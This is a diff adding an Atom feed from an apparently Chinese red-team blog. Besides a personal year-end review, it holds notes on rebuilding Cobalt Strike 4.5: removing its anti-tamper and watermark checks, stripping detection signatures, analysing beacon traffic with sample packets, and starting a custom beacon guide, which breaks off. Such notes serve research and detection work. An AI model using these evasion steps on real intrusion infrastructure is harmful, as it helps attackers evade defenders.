@@ -1,0 +1,896 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://red-team.tips</id>
+    <title>白袍的小行星</title>
+    <updated>2026-01-08T00:57:39.388Z</updated>
+    <generator>https://github.com/jpmonette/feed</generator>
+    <link rel="alternate" href="https://red-team.tips"/>
+    <link rel="self" href="https://red-team.tips/atom.xml"/>
+    <subtitle>&lt;strong&gt;Once a hacker, always a hacker!&lt;/strong&gt;</subtitle>
+    <logo>https://red-team.tips/images/avatar.png</logo>
+    <icon>https://red-team.tips/favicon.ico</icon>
+    <rights>All rights reserved 2026, 白袍的小行星</rights>
+    <entry>
+        <title type="html"><![CDATA[2025年终总结]]></title>
+        <id>https://red-team.tips/post/fyVPNlMYwS/</id>
+        <link href="https://red-team.tips/post/fyVPNlMYwS/">
+        </link>
+        <updated>2026-01-01T00:54:48.000Z</updated>
+        <content type="html"><![CDATA[<p>依然是31号晚上写年终总结，这已经成为了我跨年的一项必要仪式了，那么还是不废话，开始总结。</p>
+<h1 id="读书">读书</h1>
+<p>今年稍微读多了一些，没有特别的偏好，想读什么就读什么。</p>
+<ul>
+<li><strong>《认知驱动：做成一件对他人很有用的事》</strong>：有点像鸡汤书，但要高级很多，可以读</li>
+<li><strong>《人体简史》</strong>：很好的科普书籍</li>
+<li><strong>《仙症》</strong> ：本来想自己描述下，但始终觉得不如书本身简介的一句话来的好——”世纪之交的北方城市里，人物始终处于失落之中“</li>
+<li><strong>《生吞》</strong>：与上一本是同一个作者，悬疑小说</li>
+<li><strong>《绝叫》</strong>：女性主义小说，可能要对日本社会比较了解才能体会到其中的内涵</li>
+<li><strong>《最后的耍猴人》</strong>：很好的纪实文学，一个古老的职业是如何在现代社会中艰难爬行的</li>
+<li><strong>《梅里雪山：寻找十七位友人》</strong>：这本是一次中日联合登山事故中幸存的日本登山队员写的，值得读</li>
+<li><strong>《群星》</strong>：还不错的科幻小说，前期像悬疑恐怖，后期科幻内容差强人意吧</li>
+<li><strong>《我与地坛》</strong>：之前一直没读过全集，读完之后很有共鸣</li>
+<li><strong>《江湖丛谈》</strong>：讲真正的江湖行当、黑话和内幕的一本书</li>
+<li><strong>《沉默》</strong>：与宗教有关的一本文学，很好读</li>
+<li><strong>《南明史》</strong>：低血压必备，看完才能体会到当年那句”不复南明旧事“的内涵</li>
+<li><strong>《当代中国政府与政治》</strong> 景跃进：这是一本教材，但我觉得每个爱键政的都应该看看，可以理解为这是执政党介绍自己行事逻辑的说明书，最好是第一版和第二版都看一遍</li>
+</ul>
+<h1 id="游戏">游戏</h1>
+<ul>
+<li><strong>刺客信条·幻景</strong>：还不错的新罐头，主线略短，20多个小时就通关了</li>
+<li><strong>夺宝奇兵·古老之圈</strong>：还没打完，主要是解谜和演出，其中还有一章是关于中国淞沪抗战的</li>
+<li><strong>羊蹄山之魂</strong>：也没打完，手柄摇杆漂移送去修了，这段时间非常沉迷，已经玩了快40个小时</li>
+<li><strong>天国拯救2</strong>：仍然没打完，节奏慢</li>
+<li><strong>星际拓荒</strong>：又又没打完，很好的太空探索解谜游戏</li>
+<li><strong>赛博朋克2077</strong>：9月的时候打上mod又在PC端玩了近50个小时</li>
+<li><strong>逃离鸭科夫</strong>：10月最喜欢的游戏</li>
+</ul>
+<h1 id="工作-学习与生活">工作、学习与生活</h1>
+<p>今年最大的变化就是换了工作和城市，来到了上海。一开始有点不习惯孤独，毕竟跟上家公司的大家已经相处了三年多，即是同事也是朋友，后来慢慢也适应了，反而找到了一种平静。</p>
+<p>学习的重心也改变了，去年的英语flag推进了一些，但还是不够。</p>
+<p>5月因为出差又去了一次英国，这次是曼彻斯特，挺开心，明年想再去一次苏格兰。</p>
+<p>另外，终于去看了许嵩的演唱会，呼吸之野济南场，也算圆梦了。</p>
+<p>间歇性地开始运动，好歹动起来了，继续保持吧。</p>
+<h1 id="新的一年">新的一年</h1>
+<p>不想再立flag，到时候在2026年终总结里找我都想干什么吧。</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Cobalt Strike 4.5 二开相关笔记]]></title>
+        <id>https://red-team.tips/post/KbHZkszOlP/</id>
+        <link href="https://red-team.tips/post/KbHZkszOlP/">
+        </link>
+        <updated>2025-08-12T03:48:19.000Z</updated>
+        <content type="html"><![CDATA[<p>近期有人已经把beacon源码公布了，所以也把之前自己的一些研究笔记汇总发一下。</p>
+<p>另外想说下自己的观点：已经2025年了，所谓二开 Cobalt Strike 对绝大部分人来说都是伪需求，你能有官方团队写的好么？学习一下就行了。</p>
+<h1 id="0x1-环境搭建">0x1 环境搭建</h1>
+<h2 id="java端">Java端</h2>
+<p>可能部分人还没有Java的原生源码，所以介绍下反编译的方法。</p>
+<p>先把jar包反编译了，利用IDEA自带的<code>java-decompiler.jar</code>：</p>
+<pre><code class="language-plain">java -cp java-decompiler.jar org.jetbrains.java.decompiler.main.decompiler.ConsoleDecompiler -dgs=true cs_original/cobaltstrike.jar cs_src
+</code></pre>
+<p><code>cs_original/cobaltstrike.jar</code>是原包，<code>cs_src</code>是反编译后的输出目录，得到一个jar后缀文件，解压缩即可得到源码。</p>
+<p>IDEA新建项目，将反编译后的所有源码放入<code>decompiled_src</code>目录，原包放入<code>lib</code>目录，再在<code>File-Project Structure-Modules-Dependencies</code>中添加原包：</p>
+<figure data-type="image" tabindex="1"><img src="https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/20250812142156200.png" alt="" loading="lazy"></figure>
+<p>在<code>File-Project Structure-Artifacts</code>中添加JAR，主类为<code>aggressor.Aggressor</code>：</p>
+<figure data-type="image" tabindex="2"><img src="https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/20250812142228000.png" alt="" loading="lazy"></figure>
+<p>需要修改相应文件时，右键选择<code>Refactor-Copy file</code>，<code>To directory</code>选择<code>src</code>目录里新建的目录：</p>
+<figure data-type="image" tabindex="3"><img src="https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/20250812142239827.png" alt="" loading="lazy"></figure>
+<p>修改完成后就可以进行编译，选择<code>Build-Build Artifacts</code>，在<code>out</code>目录下得到重新打包好的jar包。</p>
+<h2 id="beacon端">Beacon端</h2>
+<p>beacon源码是纯C的，为了兼容性，需要使用<code>Visual Studio 2012</code>来开发，并且要安装<code>Update 1</code>补丁，否则无法满足平台工具集<code>Visual Studio 2012 - Windows XP (v110_xp)</code>的设置。</p>
+<p>另外还有几个地方需要修复下，不然无法通过编译。</p>
+<p><code>ReflectiveLoader.c</code>中，会出现一个<code>fatal error C1017: 无效的整数常量表达式</code>错误，代码如下：</p>
+<figure data-type="image" tabindex="4"><img src="https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/20250812142252797.png" alt="" loading="lazy"></figure>
+<p>编译时<code>RefLoadSize</code>没初始化，就会导致错误，这个实际上会在预处理器里初始化，所以这里定义一下就行，我用的<code>100</code>:</p>
+<figure data-type="image" tabindex="5"><img src="https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/20250812142316273.png" alt="" loading="lazy"></figure>
+<p>还有在<code>parse.c</code>中，<code>bool</code>标识符会报错，因为C99标准里没有<code>bool</code>只有<code>_Bool</code>，我换成了<code>BOOL</code>。</p>
+<p>另外<strong>后期生成事件</strong>里，要把命令改下，否则有可能会因为找不到路径导致失败。</p>
+<p>如果报<code>tomcrypt.lib</code>是用旧版本编译的，那就在这里把<u>全程序优化</u>设为<u>否</u>：</p>
+<figure data-type="image" tabindex="6"><img src="https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/20250812142347148.png" alt="" loading="lazy"></figure>
+<p>另外一个情况是，替换掉原来的sleeve下的dll然后生成exe，client端会报一个错误：</p>
+<figure data-type="image" tabindex="7"><img src="https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/20250812142418292.png" alt="" loading="lazy"></figure>
+<p>这是因为cs生成exe木马的逻辑是：先把回连地址等信息<code>patch</code>进<code>beacon.dll</code>，然后根据你需要的类型（exe、service exe、dll）再把<code>beacon.dll</code> <code>patch</code>进<code>artifact.xxx</code>里，这里的错误就是因为重新生成的<code>beacon.dll</code>太大导致原来的模板放不下了，所以生成出来的exe也会直接无法运行报访问冲突的错误。</p>
+<p>解决办法就是用Artifacts Kit重新生成一下即可：</p>
+<figure data-type="image" tabindex="8"><img src="https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/20250812142429582.png" alt="" loading="lazy"></figure>
+<p>记住，生成出来的东西不能直接用来替换掉resources目录下的exe，得用给的cna脚本去加载，这个b问题折磨了我好几天，问了<code>@evilash</code>才解决。</p>
+<h1 id="0x2-去除特征和修复漏洞">0x2 去除特征和修复漏洞</h1>
+<p>这里的内容参考了很多网上的文章，时间久远忘了有哪些，只列举记得的：</p>
+<ul>
+<li>https://blog.qwqdanchun.com/CobaltStrike_Modify/</li>
+</ul>
+<h2 id="去除暗桩">去除暗桩</h2>
+<p>这个版本有一堆暗桩，Java端和beacon里都有，Java里基本就是两种：</p>
+<ol>
+<li>检验某个<code>.class</code>文件是否被篡改（对比哈希），如果被篡改就退出</li>
+</ol>
+<figure data-type="image" tabindex="9"><img src="https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/20250812142442160.png" alt="" loading="lazy"></figure>
+<ol start="2">
+<li>检验是否用 Java Agent 方式启动，是则退出</li>
+</ol>
+<figure data-type="image" tabindex="10"><img src="https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/20250812142453778.png" alt="" loading="lazy"></figure>
+<p>还不少，全局搜索再耐心去掉就行。</p>
+<p>beacon端也有一处：</p>
+<figure data-type="image" tabindex="11"><img src="https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/20250812142505198.png" alt="" loading="lazy"></figure>
+<p>这两个方法的返回值都要改为<code>FALSE</code>，因为会用 teamserver 端发过来的水印值进行校验，不符合就退出，所以全部改掉。</p>
+<h2 id="cve-2022-39197修复">CVE-2022-39197修复</h2>
+<p>这个漏洞就是 Cobalt Strike 的 XSS 漏洞，可以导致 RCE ：</p>
+<figure data-type="image" tabindex="12"><img src="https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/20250812142518949.png" alt="" loading="lazy"></figure>
+<p>修复方式，在<code>aggressor.MultiFrame</code>中添加：</p>
+<pre><code class="language-java">try{
+    ClassPool pool = ClassPool.getDefault();
+    CtClass cc = pool.get(&quot;javax.swing.plaf.basic.BasicHTML&quot;);
+    CtMethod method = cc.getDeclaredMethod(&quot;isHTMLString&quot;);
+    method.setBody(&quot;return false;&quot;);
+    cc.toClass();
+}
+catch (Exception e){
+}
+</code></pre>
+<figure data-type="image" tabindex="13"><img src="https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/20250812142537266.png" alt="" loading="lazy"></figure>
+<p>这种是完全关闭 HTML 标签解析，所以可能对正常显示会造成影响，遇到了再看怎么修复。</p>
+<h2 id="修复foreign派生错误的bug">修复foreign派生错误的bug</h2>
+<p>该版本无法正常使用<code>windows/foreign/reverse_http(s)</code>进行 spawn ，但没有做判断，导致这里的<code>beaconDLL.customDLL</code>和<code>beaconDLL.customFileName</code>会为空：</p>
+<figure data-type="image" tabindex="14"><img src="https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/20250812142547945.png" alt="" loading="lazy"></figure>
+<p>暂时用直接返回原 DLL 的方式来修复，这样无法使用自定义反射 Loader：</p>
+<figure data-type="image" tabindex="15"><img src="https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/20250812142559767.png" alt="" loading="lazy"></figure>
+<p>后续再看有没有更好的办法处理。</p>
+<h2 id="修改winvncdll位置">修改winvnc.dll位置</h2>
+<p>在<code>server\ManageUser.java</code>中修改，我放进了 resources 里，这样就不用单独开一个文件夹了：</p>
+<figure data-type="image" tabindex="16"><img src="https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/20250812142611825.png" alt="" loading="lazy"></figure>
+<p>虽然 VNC 这个功能几乎用不上。</p>
+<h2 id="启用payload-generatorstageless">启用Payload Generator(Stageless)</h2>
+<p>这个是为了方便做自己想要的 Loader，因为 Stage 的 shellcode 特征更多。</p>
+<p>修改<code>scripts\default.cna</code>：</p>
+<figure data-type="image" tabindex="17"><img src="https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/20250812142622248.png" alt="" loading="lazy"></figure>
+<h2 id="修复windows-7下https问题">修复Windows 7下https问题</h2>
+<p>新版本的 Java 会默认禁用 TLS1.2 以下的协议，这样在无补丁的 Windows 7 上无法用 HTTPS 上线，修改<code>server\TeamServer.java</code>：</p>
+<figure data-type="image" tabindex="18"><img src="https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/20250812142644282.png" alt="" loading="lazy"></figure>
+<h2 id="修复cve-2022-23317">修复CVE-2022-23317</h2>
+<p><code>CVE-2022-23317</code>是 Cobalt Strike Webserver 的一个问题，利用不规则的URL访问时会产生特殊回显，导致可以识别该服务器为Cobalt Strike server，所以加个判断就行，在<code>cloudstrike\WebServer.java</code>中：</p>
+<figure data-type="image" tabindex="19"><img src="https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/20250812142702279.png" alt="" loading="lazy"></figure>
+<h2 id="去除服务端信息特征">去除服务端信息特征</h2>
+<ol>
+<li>删除服务端响应字符串</li>
+</ol>
+<p>在<code>cloudstrike/NanoHTTPD.java</code>里修改回显字符串<code>This is the default!</code>为其他的：</p>
+<figure data-type="image" tabindex="20"><img src="https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/20250812142716121.png" alt="" loading="lazy"></figure>
+<p>这里直接把<code>sendError</code>的第二个参数弃用，所有错误都只返回一个字符串：</p>
+<figure data-type="image" tabindex="21"><img src="https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/20250812142726430.png" alt="" loading="lazy"></figure>
+<ol start="2">
+<li>修改socket通信的magic值</li>
+</ol>
+<p><code>ssl\SecureServerSocket.java</code>和<code>ssl\SecureSocket.java</code>里都把<code>0xBEEF</code>改掉：</p>
+<figure data-type="image" tabindex="22"><img src="https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/20250812142735790.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="23"><img src="https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/20250812142747530.png" alt="" loading="lazy"></figure>
+<h2 id="修改默认异或密钥">修改默认异或密钥</h2>
+<p>这里不再使用原有的单字节异或密钥，而是改为多字节加密：</p>
+<figure data-type="image" tabindex="24"><img src="https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/20250812142757803.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="25"><img src="https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/20250812142807446.png" alt="" loading="lazy"></figure>
+<h2 id="修改beaconeye特征">修改BeaconEye特征</h2>
+<p>实际就是调用<code>memset()</code>时使用了0来填充，导致会有一个位置的值固定呈现为0，这个值又根本用不到，所以直接把<code>memset()</code>的参数改为另一个值即可：</p>
+<figure data-type="image" tabindex="26"><img src="https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/20250812142819073.png" alt="" loading="lazy"></figure>
+<h2 id="sleep-mask未混淆部分的内存特征">Sleep Mask未混淆部分的内存特征</h2>
+<p><a href="https://codex-7.gitbook.io/codexs-terminal-window/blue-team/detecting-cobalt-strike/sleep-mask-kit-iocs">https://codex-7.gitbook.io/codexs-terminal-window/blue-team/detecting-cobalt-strike/sleep-mask-kit-iocs</a></p>
+<p>这个暂时先不修复，可以靠高版本sleepmask解决。</p>
+<h2 id="其他">其他</h2>
+<p>修改默认client配置文件名，在<code>aggressor\Prefs.java</code>中：</p>
+<figure data-type="image" tabindex="27"><img src="https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/20250812142850182.png" alt="" loading="lazy"></figure>
+<p>这个是为了防止蜜罐读取本地文件，导致接管CS。</p>
+<h2 id="修复beaconformattostring错误">修复BeaconFormatToString错误</h2>
+<p>4.6版本更新日志中提到一个修复： 修复了在 BOF 中调用 BeaconFormatToString 时错误地要求传递字符串长度地址的问题。</p>
+<p>BeaconFormatToString的功能为将格式化数据提取为一个字符串，并用该字符串的长度填充传入的 size 变量：</p>
+<pre><code class="language-c">char * BeaconFormatToString (formatp * obj, int * size)
+</code></pre>
+<p>定位一下，发现该函数结果来源于：</p>
+<pre><code class="language-c">char * bformat_tostring(formatp * buffer, int * size) {
+	DWORD len = bformat_length(buffer);
+	if (size != NULL)
+		*size = (int)len;
+
+	if (size == 0)
+		return NULL;
+
+	return bformat_string(buffer);
+}
+</code></pre>
+<p>问题很明显，传入的是字符串长度的指针，但是却判断了它是否为0，实际上应该判断的是len：</p>
+<pre><code class="language-c">char * bformat_tostring(formatp * buffer, int * size) {
+    DWORD len = bformat_length(buffer);    
+    
+    if (size != NULL) {
+        *size = (int)len;
+    }
+
+    if (len == 0) {
+        return NULL;
+    }
+
+    char *str = bformat_string(buffer);
+    return str;
+}
+</code></pre>
+<h1 id="0x3-普通功能增加">0x3 普通功能增加</h1>
+<h2 id="已登录用户显示">已登录用户显示</h2>
+<p>用户登录如果使用同一个用户名，会提示该用户已存在，校验点在<code>server/ManageUser.java</code>：</p>
+<figure data-type="image" tabindex="28"><img src="https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/20250812142902538.png" alt="" loading="lazy"></figure>
+<p>而已登录的用户名数据是存在<code>server.Resources</code>里的，所以要从这里面把数据取出来。</p>
+<p>这里要理清代码结构还是挺麻烦的，有以下几个问题需要解决：</p>
+<ol>
+<li>找到teamserver向client传递数据的方法，然后把已登录用户数据加进来</li>
+<li>用户登录和用户退出要自动进行增减</li>
+</ol>
+<p>在<code>server.Resources</code>里我新加了一个成员变量，用来存储用户的用户名、登录IP、登录时间，这个变量得是<code>LinkedList</code>对象，不然后期解析会出问题。</p>
+<p><code>getOnlineUsers()</code>就是获取数据的方法：</p>
+<figure data-type="image" tabindex="29"><img src="https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/20250812142909753.png" alt="" loading="lazy"></figure>
+<p>用户登录IP在<code>TeamSocket</code>对象的<code>from</code>字段，加了个方法用来获取它。</p>
+<p>之后则是在用户登录和退出的时候，自动将<code>LinkedList</code>对象中的<code>hashmap</code>进行增删：</p>
+<figure data-type="image" tabindex="30"><img src="https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/20250812142919075.png" alt="" loading="lazy"></figure>
+<p>这里最主要把<code>LinkedList</code>对象中的格式搞清楚。</p>
+<p>之后就是在用户登录和退出的地方调用这两个方法：</p>
+<figure data-type="image" tabindex="31"><img src="https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/20250812142931509.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="32"><img src="https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/20250812142948655.png" alt="" loading="lazy"></figure>
+<p>还有一个问题就是传递数据，也是调试了挺久，最后发现用<code>broadcast()</code>方法就可以：</p>
+<figure data-type="image" tabindex="33"><img src="https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/20250812142959304.png" alt="" loading="lazy"></figure>
+<p>最后就是添加UI，这个也麻烦，最终是照着<code>Credential</code>显示功能做完了：</p>
+<figure data-type="image" tabindex="34"><img src="https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/20250812143006813.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="35"><img src="https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/20250812143014532.png" alt="" loading="lazy"></figure>
+<p>最后的效果：</p>
+<figure data-type="image" tabindex="36"><img src="https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/20250812143022832.png" alt="" loading="lazy"></figure>
+<h2 id="windows错误代码解析">Windows错误代码解析</h2>
+<p>这个功能是新版本官方加了的，虽然不难，但Windows错误代码得有几万个，全弄进来麻烦死了。</p>
+<p><code>beacon/BeaconC2.java</code>这里是 Teamserver 向 Client 发送执行结果回显的代码：</p>
+<figure data-type="image" tabindex="37"><img src="https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/20250812143033711.png" alt="" loading="lazy"></figure>
+<p><code>errorNo</code>是 Cobalt Strike 本身的错误代码，可以在<code>beacon/BeaconErrors.java</code>里找到：</p>
+<figure data-type="image" tabindex="38"><img src="https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/20250812143042061.png" alt="" loading="lazy"></figure>
+<p>而<code>arg1</code>就是 Windows 错误代码，去做个判断就行，但是几万个。。。算了吧，手查一下也费不了什么事。</p>
+<figure data-type="image" tabindex="39"><img src="https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/20250812143051425.png" alt="" loading="lazy"></figure>
+<h1 id="0x4-beacon细节">0x4 Beacon细节</h1>
+<h2 id="通信情况">通信情况</h2>
+<p>Cobalt Strike 用 AES 和 RSA 结合的方式进行通信，teamserver会新建一个密钥对并存储在<code>.cobaltstrike.beacon_keys</code>中。</p>
+<p>RSA 使用<code>RSA/ECB/PKCS1Padding</code>，AES 使用<code>AES/CBC/NoPadding</code>，并使用了硬编码的iv：<code>abcdefghijklmnop</code></p>
+<figure data-type="image" tabindex="40"><img src="https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/20250812143306880.png" alt="" loading="lazy"></figure>
+<h2 id="数据包结构">数据包结构</h2>
+<h3 id="1-心跳包">1. 心跳包</h3>
+<p>心跳包就是Beacon 按照 Sleep 设置的时间，定时向 TeamServer 发起 HTTP GET 请求，以获取客户端下发的指令，然后根据指令的内容执行对应的代码。</p>
+<p>心跳包结构：</p>
+<figure data-type="image" tabindex="41"><img src="https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/20250812143316498.png" alt="" loading="lazy"></figure>
+<ul>
+<li>Magic Number（固定值：0x0000beef即48879），4字节</li>
+<li>Size of Data，4字节（值要小于等于117字节）</li>
+<li>Raw key，16字节</li>
+<li>Code Page Charset，这里是ANSI，2字节，小端序</li>
+<li>OEM Charset，2字节，小端序</li>
+<li>Beacon ID，4字节，大端序，每个Beacon唯一，随机生成</li>
+<li>Beacon Process ID，4字节，大端序</li>
+<li>Port，2字节</li>
+<li>Flag，1字节，用来标识是否为高权限、x86/x64</li>
+<li>Beacon Version，2字节</li>
+<li>Beacon Build Version，2字节</li>
+<li>64 bit Pointer Prefix，4字节，大端序，目标系统为64位则添加函数指针前缀，32位则丢弃</li>
+<li><code>GetModuleHandleA</code> ptr，4字节，用来帮助shellcode在没有显式导入的情况下解析其他函数。如果beacon是64位的，则前两个字节带有前缀并将值存储在变量中</li>
+<li><code>GetProcAddress</code> ptr，4字节，同上</li>
+<li>Target IP，4字节，按C0A8C882的方式解析</li>
+<li>Target Info，剩余字节，ASCII编码，不超过58字节，包括了主机名、用户名、Beacon进程名，中间以<code>\t</code>分割</li>
+</ul>
+<p>心跳包会用RSA公钥加密，再根据 C2Profile 的配置进行编码，然后通过GET请求发送到teamserver</p>
+<p>之后通信时，会使用AES加密。</p>
+<h3 id="2-任务下发通信包">2. 任务下发通信包</h3>
+<p>当在teamserver端执行命令后，命令会被放入任务队列，等待下一次beacon回连请求时，再通过响应包的方式传递给beacon端。</p>
+<figure data-type="image" tabindex="42"><img src="https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/20250812143406782.png" alt="" loading="lazy"></figure>
+<p>心跳包中的<code>Raw key</code>将用来生成<code>AES Key</code>和<code>HMAC Key</code>，生成方法是计算<code>Raw key</code>的SHA256值，之后前16字节为<code>AES Key</code>，后16字节为<code>HMAC Key</code>.</p>
+<p>raw key:</p>
+<pre><code>ef5ed760fba60e1973c8c3dbe001d86b
+</code></pre>
+<p>获得AESkey和HMAC key：</p>
+<pre><code class="language-python">import hashlib
+
+hex_string = &quot;e7b6c3dcbbaa7d6f8d6c7a5b4c3d2e1&quot;
+byte_string = bytes.fromhex(hex_string)
+hash_object = hashlib.sha256(byte_string)
+hex_dig = hash_object.hexdigest()
+print(hex_dig)
+</code></pre>
+<pre><code class="language-html"> aeskey:  97bc13f770f8dc2547a530536f08c2f1
+ hmackey: 876d31a333a9fdb6e46043b434f41246
+</code></pre>
+<p>指令下发数据，64字节：</p>
+<pre><code class="language-html">39aa6deab09da5f37125d732d559aba7465d1c648bfd3696cc0486dcb0ff88235ca309d67cf911da37e6e03d6628b13b1ac60df7a597517038d939cf1ab2880b71f343e7599a704c815099837e258598
+</code></pre>
+<p>其中最后16个字节为HMAC签名，用来校验数据包是否完整且未篡改。</p>
+<p>进行AES解密，IV为 <code>abcdefghijklmnop</code>，模式为<code>AES/CBC/NoPadding</code>，解得hex为：</p>
+<pre><code class="language-html">6530a91d0000002b0000004e000000230000000925434f4d535045432500000010202f432077686f616d69202f70726976000041414141414141414141414141c2b4a44fad005096e1c2b19e1ddeca67
+</code></pre>
+<p>这里就是下发的命令：</p>
+<pre><code class="language-html">6530a91d 前4个字节丢弃，实际是系统时间/1000
+0000002b 数据大小
+0000004e 任务类型 0x4e = 78 即SHELL类型任务
+00000023 4字节，标识有效命令字节长度
+00000009 4字节，标识环境变量的长度
+25434f4d5350454325 9字节，环境变量，标识了cmd.exe的位置
+00000010 命令执行参数的长度
+202f432077686f616d69202f707269760000 命令执行参数的内容
+41414141414141414141414141 长度不足16倍数的情况下会补A字符
+</code></pre>
+<h3 id="3-完成后回传结果通信包">3. 完成后回传结果通信包</h3>
+<p>执行完成后，beacon用POST方式请求teamserver，将结果回传：</p>
+<figure data-type="image" tabindex="43"><img src="https://adan0s-1256533472.cos.ap-nanjing.myqcloud.com/uPic/20250812143429957.png" alt="" loading="lazy"></figure>
+<p>这里的结果也是AES加密的：</p>
+<pre><code class="language-html">000001f008fb3bd328ed1c66c1539f3613a2848bd1e9ec3dfca9dba55351bbd3eae2e335ce338cc12ce848275713ec035eaeac838460244409d67fb63c44312fa703ec858d4bf6b365584acf487b35ade23af66be28a32b29dba65b216bd6d1ff96ab418c8ec919b7bc5a83b486f99d66193653137b47d6d25fef61ab87517fa7293f8b7b9c9d75d5ced6d139251d1695ca4589a56a8a81464d474a54adce068f9150406c97d58f69a49ed3b997d65e1e1764595d37e8254442226d00e92c1a8a4f2ac43e317d905ad66a77466533b720cad9bcbedb4d676df90f38ec442f06cd7e9392e8ab00e6c2f950b1c6c9814079fcdf6dd378e4f61e5eeb2a8ff86e1de8d9d5de8d95a84e61221f76b278e56197c3d23de3fb9b032e961a2ea5cc1e6f7d601ed4a5880465a28edd8a95f1a6ee8e1cccf0fd31a737e2fe139c3c40dd481a5255962fb84c02016535a803a257eff851ab496831d6788650f2644b250fbafb9723a8fed195f0d85633465d1553abe27a71e95047a2ddc68245b2107dfc723e3d761185b4fb6f82fbf9915775a008bab39fe98c1ac17ea1327071deb91d68e64de3108435864dde5f36423a0488d9ffc5b9a0a6e83e6b65918a84f1476c2904d8236f6161fbaec21d2868344e08241885aabbfaf1e63f46791a96ce75921e5a8dc89d853c36b3f65b606328a8e27a05d02f242
+</code></pre>
+<p>去掉前面4个字节和最后的16个字节，AES解密得到：</p>
+<pre><code class="language-html">00000002000001c70000001e0d0accd8c8a8d0c5cfa20d0a2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d0d0a0d0accd8c8a8c3fb202020202020202020202020202020202020202020202020c3e8caf62020202020202020202020202020202020d7b4ccac20200d0a3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d203d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d3d203d3d3d3d3d3d0d0a536553687574646f776e50726976696c6567652020202020202020202020b9d8b1d5cfb5cdb320202020202020202020202020d2d1bdfbd3c30d0a53654368616e67654e6f7469667950726976696c65676520202020202020c8c6b9fdb1e9c0fabcecb2e9202020202020202020d2d1c6f4d3c30d0a5365556e646f636b50726976696c65676520202020202020202020202020b4d3c0a9d5b9ceebc9cfc8a1cfc2bcc6cbe3bbfa20d2d1bdfbd3c30d0a5365496e637265617365576f726b696e6753657450726976696c65676520d4f6bcd3bdf8b3ccb9a4d7f7bcaf20202020202020d2d1bdfbd3c30d0a536554696d655a6f6e6550726976696c6567652020202020202020202020b8fcb8c4cab1c7f820202020202020202020202020d2d1bdfbd3c30d0a0000000000000000000000000000000000
+</code></pre>
+<p>回传消息包结构为：</p>
+<pre><code class="language-html">结果长度 4字节 大端序 000001f0 即496（4+4+4+451+17+16）
+加密内容 480字节
+  	计数器 4字节 大端序 00000002 
+  	后续结果长度（类型+结果） 4字节 大端序 000001c7 即455
+  	callback类型 4字节 大端序  0000001e 即30 
+  	执行结果 451字节
+  	padding 补充了17字节的0
+HMAC签名 16字节
+</code></pre>
+<h2 id="自实现beacon要点">自实现beacon要点</h2>
+<h3 id="1-配置信息与编译">1. 配置信息与编译</h3>
+<p>Cobalt Strike 的生成exe，是把c2profile的信息异或加密后再patch进去的，beacon在初始化时会解密然后解析。</p>
+<p>为了实现云编译以及多样化，c2profile的信息最好不要直接写死在代码中，从外部读取解析最好。</p>
+<p>两种方案，第一种是参照WBGII的ReBeacon_src项目，在CS上生成raw，提取相应信息再patch进代码，这种就还需要异或解密一次；第二种则是完全的自实现，只依赖配置好的c2profile内容和部分信息。</p>
+<p>针对自实现方案，为实现正常上线和控制，需要外部的相关信息有（针对http/https监听器）：</p>
+<ul>
+<li>RSA公钥：用来加密心跳包的元数据，存储在teamserver生成的<code>.cobaltstrike.beacon_keys</code>中</li>
